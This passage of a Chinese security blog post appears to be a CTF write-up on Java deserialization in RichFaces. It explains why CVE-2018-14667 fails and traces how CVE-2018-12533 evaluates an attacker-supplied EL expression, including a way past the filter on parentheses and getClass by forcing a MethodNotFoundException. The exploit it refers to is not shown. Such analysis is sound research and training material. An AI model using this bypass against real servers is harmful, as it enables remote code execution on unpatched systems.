+<h4 id="CVE-2018-14667失败原因"><a href="#CVE-2018-14667失败原因" class="headerlink" title="CVE-2018-14667失败原因"></a>CVE-2018-14667失败原因</h4><p>CVE-2018-14667利用的是<code>UserResource$UriData </code>,按照网上的分析文章，<code>UserResource$UriData</code>应该是实现了<code>org.ajax4jsf.resource.SerializableResource</code>接口，因此它也可以被反序列化，但是在这里它却是实现了<code>Serializable</code>接口，因此这条路就封死了</p>
+<p><img src="https://i.loli.net/2021/02/11/p2dkYqJFfcP3R9o.png" srcset="/img/loading.gif"></p>
+<h4 id="CVE-2018-12533失败原因"><a href="#CVE-2018-12533失败原因" class="headerlink" title="CVE-2018-12533失败原因"></a>CVE-2018-12533失败原因</h4><p>CVE-2018-12533利用的是<code>paint2DResource$ImageData</code>,它正好在白名单中，<code>org.richfaces.renderkit.html.Paint2DResource$ImageData</code>,因此就他就能被利用，那么就一步步分析一下触发过程</p>
+<p>直接来到反序列化的点</p>
+<p>被反序列化的是<code>paint2DResource$ImageData</code>，然后还有很多被反序列化的类，这可以直接通过反序列化后的<code>IamgeData</code>里的变量进行查看</p>
+<p><img src="https://i.loli.net/2021/02/11/wed2aJOogrxL9jE.png" srcset="/img/loading.gif"></p>
+<p>它里面最重要的属性就是<code>_paint</code></p>
+<p><img src="https://i.loli.net/2021/02/11/ZaQD1794HesPNFX.png" srcset="/img/loading.gif"></p>
+<p>可以看到存在一个el表达式，这里就是我们要利用的点</p>
+<p><img src="https://i.loli.net/2021/02/11/2uWqBzf56ySgwCP.png" srcset="/img/loading.gif"></p>
+<p>继续执行下去，查看触发el表达式执行的地方</p>
+<p>回到<code>InternetResourceService#serviceResource</code>,在最后调用<code>ResourceLifecycle#send</code></p>
+<p><img src="https://i.loli.net/2021/02/11/9JhtILMjSNl5Xuq.png" srcset="/img/loading.gif"></p>
+<p>进而调用<code>Paint2DResource#send</code></p>
+<p><img src="https://i.loli.net/2021/02/11/wNkcKnRULsYF7oO.png" srcset="/img/loading.gif"></p>
+<p><code>Paint2DResource#send</code>,里先获取<code>Paint2DResource$ImageData</code>,然后获取paint属性，获取它的el表达式，进入正则匹配中，过滤了左括号和<code>getClass</code>，如果都不存在，就会执行<code>Invoke</code></p>
+<p><img src="https://i.loli.net/2021/02/11/MkgxTNb5lZdnpiX.png" srcset="/img/loading.gif"></p>
+<p>重点在<code>StateMethodExpressionWrapper#invoke</code>，它先用<code>MethodExpressionImpl</code>调用invoke，如果报错，就会进入<code>this.baseObjectExpression.getValue(context)</code>即<code>VauleExpressionImpl</code>的<code>GetValue</code>.（我们绕过正则的点就在这了<img src="https://i.loli.net/2021/02/11/qEa9YlVDcTAjwvJ.png" srcset="/img/loading.gif"></p>
+<p>先看正常的el表达式执行的点</p>
+<p>在<code>AstValue#invoke</code>,调用了<code>AstValue#GetTarget</code></p>
+<p><img src="https://i.loli.net/2021/02/13/VeK9HaCYtOSIuQA.png" srcset="/img/loading.gif"></p>
+<p><code>AstValue#GetTarget</code>,在这里获取了第一个对象，然后在<code>AstPropertySuffix#invoke</code>执行了方法<img src="https://i.loli.net/2021/02/13/JeOMlozrYDyZEmb.png" srcset="/img/loading.gif"></p>
+<p>可是上面的点执行点有过滤,过滤了左括号和getClass,导致这个点无法利用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (!Pattern.matches(<span class="hljs-string">&quot;[^\\\\(]*&quot;</span>, expr) || Pattern.matches(<span class="hljs-string">&quot;.*getClass.*&quot;</span>, expr)) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException(<span class="hljs-string">&quot;not allowd execute.&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+<h4 id="破局"><a href="#破局" class="headerlink" title="破局"></a>破局</h4><p>在上面一连串的<code>invoke</code>中，有一个invoke方法</p>
+<p><code>StateMethodExpressionWrapper#invoke</code>,当<code>MethodExpressImpl#invoke</code>爆出<code>MethodNotFoundException</code>时，就会调用<code>ValueExpressImpl#getValue</code>,它其实也会执行el表达式</p>
+<p><img src="https://i.loli.net/2021/02/13/SZhNOk1egRvM5jc.png" srcset="/img/loading.gif"></p>
+<p>getValue的EL表达式执行点在这</p>
+<p><img src="https://i.loli.net/2021/02/13/ftO5TIwhr7VBuvC.png" srcset="/img/loading.gif"></p>
+<p>于是，破局的方法就是，设法让<code>MethodExpressImpl#invoke</code>爆错，然后进入<code>ValueExpressImpl#getValue</code>,这样就能即绕过了过滤，也执行了el表达式</p>
+<p>exp就是上面的了</p>
+<p>参考</p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/766/">https://paper.seebug.org/766/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/170780#h2-1">https://www.anquanke.com/post/id/170780#h2-1</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/java%E9%A2%98%E7%9B%AE/">java题目</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/02/19/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE-RealWorld-CTF-2020-oldsystem/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">JAVA反序列化题目-RealWorld CTF 2020 oldsystem</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/02/19/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE-%E5%BC%BA%E7%BD%91%E6%9D%AF-2018-%E5%BD%A9%E8%9B%8B/">
+                        <span class="hidden-mobile">JAVA反序列化题目-强网杯 2018 彩蛋</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
